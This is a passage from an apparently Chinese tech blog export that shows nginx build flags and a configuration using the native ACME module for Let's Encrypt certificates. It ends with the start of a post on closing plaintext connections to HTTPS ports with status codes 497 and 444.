style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-client-body-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/client_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-proxy-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/proxy_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-fastcgi-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/fastcgi_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-uwsgi-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/uwsgi_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-scgi-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/scgi_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --user\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enginx \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --group\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enginx \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-compat \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-file-aio \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-threads \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_addition_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_auth_request_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_dav_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_flv_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_gunzip_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_gzip_static_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_mp4_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_random_index_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_realip_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_secure_link_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_slice_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_ssl_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_stub_status_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_sub_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_v2_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_v3_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-mail \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-mail_ssl_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream_realip_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream_ssl_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream_ssl_preread_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-cc-opt\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-g -O2 -ffile-prefix-map=/home/builder/debuild/nginx-1.28.0/debian/debuild-base/nginx-1.28.0=. -fstack-protector-strong -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-ld-opt\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --add-dynamic-module\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx-build/nginx-acme\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    make modules \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    make install\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 运行配置脚本，这里的关键是 --add-dynamic-module\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 注意：您需要在这里包含您当前 NGINX 已有的所有编译参数，可以通过 nginx -V 查看\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 编译模块，注意是 make modules 而不是 make install\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"config\"\u003econfig\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /app/nginx/conf/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003euser\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enginx\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eerror.log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003edebug\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epid\u003c/span\u003e        \u003cspan style=\"color:#e6db74\"\u003enginx.pid\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eload_module\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emodules/ngx_http_acme_module.so\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eevents\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eworker_connections\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003emulti_accept\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e       \u003cspan style=\"color:#e6db74\"\u003emime.types\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eapplication/octet-stream\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elog_format\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003emain\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$remote_addr \u003cspan style=\"color:#e6db74\"\u003e-\u003c/span\u003e $remote_user \u003cspan style=\"color:#e6db74\"\u003e[\u003c/span\u003e$time_local] \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$host\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$request\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$status $body_bytes_sent \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_referer\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e$http_user_agent\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_x_forwarded_for\u0026#34;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eaccess.log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003emain\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003esendfile\u003c/span\u003e       \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etcp_nopush\u003c/span\u003e     \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003echarset\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eutf-8\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ekeepalive_timeout\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003egzip\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eresolver\u003c/span\u003e 8.8.8.8 1.1.1.1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 定义一个名为 letsencrypt 的 ACME 颁发机构实例\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eacme_issuer\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eletsencrypt\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 指定 ACME 服务提供商的目录 URL，这里是 Let\u0026#39;s Encrypt 的生产环境\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003euri\u003c/span\u003e         \u003cspan style=\"color:#e6db74\"\u003ehttps://acme-v02.api.letsencrypt.org/directory\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 提供一个联系邮箱，用于接收 CA 的重要通知（如证书即将过期）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003econtact\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003emailto:security-alerts@aidig.co\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 指定状态文件的存储路径，用于保存 ACME 账户密钥，非常重要\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003estate_path\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eacme/letsencrypt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 同意服务条款，对于 Let\u0026#39;s Encrypt 等 CA 这是必需的步骤\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eaccept_terms_of_service\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 可选指令 acme_shared_zone，用于存储所有配置的证书颁发者的证书、私钥和挑战数据。该区域默认大小为 256K，可根据需要增加\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eacme_shared_zone\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=acme_shared:1M\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl.aidig.co\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 步骤一：声明此 server 块启用 ACME，并指定使用上面定义的 letsencrypt 颁发机构\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eacme_certificate\u003c/span\u003e    \u003cspan style=\"color:#e6db74\"\u003eletsencrypt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 步骤二：使用动态变量加载由 ACME 模块在内存中管理的证书和私钥\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e     $acme_certificate;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e   $acme_certificate_key;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_cache\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003emax=2\u003c/span\u003e;  \u003cspan style=\"color:#75715e\"\u003e# required ngx 1.27.4+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/plain\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;OK\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# ACME 模块会自动处理 /.well-known/acme-challenge/ 的请求，此 location 用于处理所有其他请求\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e301\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://\u003c/span\u003e$host$request_uri;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","NGINX","ACME","module"],"title":"NGINX 原生 ACME 支持：从根本上重塑 TLS 自动化部署"},{"categories":["URL","NGINX"],"contents":" 降低家用 Web 服务被通报的概率\n通过明文协议尝试请求 HTTPS 服务在 Nginx 中有分配特殊的 497 状态码。如果发生该报错，我们希望 Nginx 直接关闭连接，不返回任何响应。这需要用到另外一个非标状态码 444，综合两种状态码，我们需要在 server 中增加如下配置：\nerror_page 497 @close; location @close { return 444; } 使用 error_page 指令为 497 状态码设置虚拟路径@close，Nginx 在处理的@close 时发现是返回 444 状态码，于是直接关闭连接。\n这个时候你再用 curl 访问对应的端口就会收到如下报错：\ncurl http://example.zz.ac:5678 curl: (52) Empty reply from server\nserver { listen 5678 ssl; 